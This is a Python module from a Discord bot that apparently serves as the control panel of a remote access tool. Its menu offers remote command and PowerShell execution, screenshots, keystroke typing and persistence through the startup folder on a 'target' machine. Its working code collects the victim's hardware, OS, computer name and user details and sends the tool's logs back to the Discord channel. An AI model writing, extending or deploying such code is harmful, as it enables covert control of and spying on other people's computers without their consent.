import discord
from discord import app_commands
import config
import os
from core.logger import logger
from helpers.hardware import *
from datetime import datetime
import time


def home():
    embed = discord.Embed(
        title="Functions",
        description=(
            "**System**:\n"
            "> `shutdown`: Shutdown the system\n"
            "> `execute`: Executes a command or powershell script\n"
            "> `notification`: Sends a windows notification\n"
            "> `volume`: Changes system volume `(0-100%)`\n"
            "> `wallpaper`: Change system wallpaper (`12MB MAX` png, jpg, jpeg, bmp)\n"
            "**Sound**\n"
            "> `playsound`: Plays a **.wav** sound `10MB MAX`\n"
            "> `tts`: Plays a text to speech sound using windows tts engine\n"
            "**Misc**\n"
            "> `ping`: Ping the bot *(ref: 5-385ms)*\n"
            "> `screenshot`: Takes a screenshot\n"
            "> `type`: Type a message with givin wpm *(words per minute)*"
        ),
        color=config.embedcolor
    )
    embed.add_field(name="Useful scripts", value="**`ALT+F4` PS** (classic):\n```(New-Object -ComObject WScript.Shell).SendKeys('%{F4}')```\n**`BEEP` PS**:\n```[console]::beep(1000, 500)``` *arg1: freq, arg2: time(ms)*", inline=False)
    embed.set_footer(text=f"Commands grouped in /functins | {config.version}")
    embed.set_thumbnail(url="https://c.tenor.com/Sumg6_XEn5QAAAAd/tenor.gif")
    return embed




class Dropper(discord.ui.Select):
    def __init__(self):
        options = [
            discord.SelectOption(label='Functions', description='Functions list (main menu)', emoji='📜', value="fun"),
            discord.SelectOption(label='Resources', description='View current target hardware & preformance', emoji='🔋', value="res"),
            discord.SelectOption(label='Log', description='Access the \"thing\"\'s logs', emoji='📝', value="log"),
            discord.SelectOption(label='Attach', description='Attempt attaching to the startup folder', emoji='📎', value="attach"),
            discord.SelectOption(label='Uninstall', description='Delete the \"thing\" from the target completely', emoji='❌', value="remove"), 
            discord.SelectOption(label='Edit Config source', description='Edit the source of the json configuration file', emoji='⚙', value="config"), 
        ]
    
        super().__init__(placeholder='cool droppa', options=options, min_values=1, max_values=1)

    async def callback(self, interaction: discord.Interaction):
        try:
          so = self.values[0]
          if so == "fun":
            embed = home()
            await interaction.response.edit_message(embed=embed, view=Dropperview())
          elif so == "res":
            embed = discord.Embed(description=f"⏳ | Fetching data...", color=discord.Color.orange())
            m = await interaction.response.edit_message(embed=embed, view=None)
            cpu = CPU()
            gpu = GPU()
            mems = Memory()  
            disks = Disk()
            oss = get_os()
            description=(
                "**CPU**:\n"
                f"> **Name**: {cpu.name} (`{cpu.get_speed()}`GHz)\n"
                f"> **Cores**: `{cpu.cores}`\n"
                f"> **Threads**: `{cpu.threads}`\n"
                f"> **Usage** *(at <t:{int(time.time())}:T>)*: `{cpu.get_usage()}`%\n"
                "**GPU**\n"
            )
            for idx, gpu_info in enumerate(gpu.gpus):
                description += f"> **GPU {idx}**: {gpu_info['name']} (VRAM:` {gpu_info['vram'] if gpu_info['vram'] != 0 else '??'}GB`)\n"
                
            description += (
                "**Memory (RAM)**\n"
            )
            
            for stick, info in enumerate(mems.sticks):
                description += f"> **Stick {stick}**: `{info['size_gb']}GB {info['type']}`\n"
                
                
            description += (        
                "**Disks**\n"
            )
            
            for disk in disks.disks:
                description += f"> **Disk {disk['name']}** `{disk['size_gb']}GB` (`{disk['free_gb']}GB` free)\n"
                
            description += (
                "**OS**\n"
                f"> **Name**: {oss['os']} {oss['release']}\n"
                f"> **Version**: `{oss['version']}`\n"
                f"> **Architecture**: `{oss['arch']}`\n"
                f"> **Computer**: {oss['computer']} (user: {oss['current_user']})"
            )    
                
            embed = discord.Embed(title="Resources", color=config.embedcolor)
            embed.description = description
            embed.set_footer(text=f"Some info may not be found | {config.version}")
            msg = await interaction.channel.fetch_message(m.message_id)
            if msg:
              await msg.edit(embed=embed, view=Dropperview())
            
            
          elif so == "log":
              log_file = os.path.join(config.cdirectory, 'logger.log')
              lC = None
              with open(log_file, 'r') as f:
                  lC = f.read()   
                  
              ihatediscord = lC[:1750] + "..." if len(lC) > 1750 else lC
              embed = discord.Embed(title="Log", description=f"```{ihatediscord}```\n*(low level logs may be hidden)*", color=config.embedcolor)
              embed.set_footer(text=f"Log file {datetime.now().date()}")
              await interaction.response.edit_message(embed=embed, view=Dropperview(log=log_file)) 
          else:
              await interaction.response.send_message("soon inshallah", ephemeral=True)     
                     
        except Exception as e:
            await Bot.error(interaction, Bot, e)
            
            
class Log(discord.ui.Button):
    def __init__(self, log):
        self.log = log
        super().__init__(
            label="Get log",
            style=discord.ButtonStyle.primary,
        )

    async def callback(self, interaction: discord.Interaction):   
        await interaction.response.send_message(file=discord.File(self.log))
        
class Refresh(discord.ui.Button):
    def __init__(self):
        super().__init__(
            label="Refresh",
            style=discord.ButtonStyle.gray,
        )

    async def callback(self, interaction: discord.Interaction):   
         log_file = os.path.join(config.cdirectory, 'logger.log')
         lC = None
         with open(log_file, 'r') as f:
             lC = f.read()   
             
         ihatediscord = lC[:1750] + "..." if len(lC) > 1750 else lC
         embed = discord.Embed(title="Log", description=f"```{ihatediscord}```\n*(low level logs may be hidden)*", color=config.embedcolor)
         embed.set_footer(text=f"Log file {datetime.now().date()}")
         await interaction.response.edit_message(embed=embed, view=Dropperview(log=log_file))
                 
         
            
class Dropperview(discord.ui.View):
    def __init__(self, log=None):
        super().__init__(timeout=None) 
        self.add_item(Dropper())
        if log:
            self.add_item(Log(log))
            self.add_item(Refresh())
        

@app_commands.command(name="panel", description="Control panel")
async def command(interaction: discord.Interaction):
    embed = home()
    await interaction.response.send_message(embed=embed, view=Dropperview())

async def setup(bot):
    global Bot 
    Bot = bot
    bot.tree.add_command(command)
